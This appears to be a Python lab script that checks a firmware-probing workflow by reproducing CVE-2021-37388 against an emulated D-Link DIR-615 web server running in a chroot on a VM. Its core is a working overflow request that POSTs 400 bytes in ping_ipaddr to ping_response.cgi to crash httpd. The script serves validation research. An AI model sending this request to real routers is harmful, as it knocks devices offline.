"""交叉验证：能不能用同一套流程复现已知的 CVE-2021-37388。

那条是 DIR-615 C2 3.03 上 `ping_response.cgi` 的 `ping_ipaddr` 缓冲区溢出，
效果同样是"把 Web 服务打崩"。如果我们能复现它，说明这套探针不是只会报我们想看的。

    py -3 lab/walk5_cve_like.py
"""

import sys

import vm

ROOT = "/home/ubuntu/lab/d615/root"
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SCRIPT = f"""
set -u
pkill -9 -x httpd 2>/dev/null; sleep 0.4
( chroot {ROOT} /sbin/httpd -h /www -p 80 >/tmp/h3.log 2>&1 & )
for i in 1 2 3 4 5 6 7 8 9 10; do
  (echo > /dev/tcp/127.0.0.1/80) >/dev/null 2>&1 && break
  sleep 0.3
done
python3 - <<'PY'
import socket

def post(path, body):
    s = socket.create_connection(("127.0.0.1", 80), 5)
    req = (f"POST {{path}} HTTP/1.0\\r\\nHost: 127.0.0.1\\r\\n"
           f"Content-Type: application/x-www-form-urlencoded\\r\\n"
           f"Content-Length: {{len(body)}}\\r\\n\\r\\n").encode() + body.encode()
    s.sendall(req)
    d = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            d += c
    except OSError:
        pass
    s.close()
    return d

# 先确认这个端点存在（不带参数的基线）
print("基线 GET  /ping_response.cgi  ->", len(
    (lambda: (lambda s: (s.sendall(b"GET /ping_response.cgi HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n"),
                          s.recv(4096), s.close())[1])(
        socket.create_connection(("127.0.0.1", 80), 5)))()), "字节")

# 再按 CVE-2021-37388 的描述打一个超长 ping_ipaddr
d = post("/ping_response.cgi", "ping_ipaddr=" + "A" * 400 + "&ping=1")
print("POST ping_ipaddr=400×A  -> ", len(d), "字节",
      d.split(b"\\r\\n")[0][:40] if d else "(空响应)")
PY
sleep 1
echo "进程=$(pgrep -x httpd >/dev/null && echo up || echo down)"
echo "服务端最后一行：$(tail -1 /tmp/h3.log 2>/dev/null)"
pkill -9 -x httpd 2>/dev/null
exit 0
"""


def main() -> int:
    _rc, out, err = vm.run(SCRIPT, timeout=300, sudo=True)
    sys.stdout.write(out)
    if err.strip():
        sys.stderr.write("\n--- stderr ---\n" + err[-300:])
    return 0


if __name__ == "__main__":
    sys.exit(main())
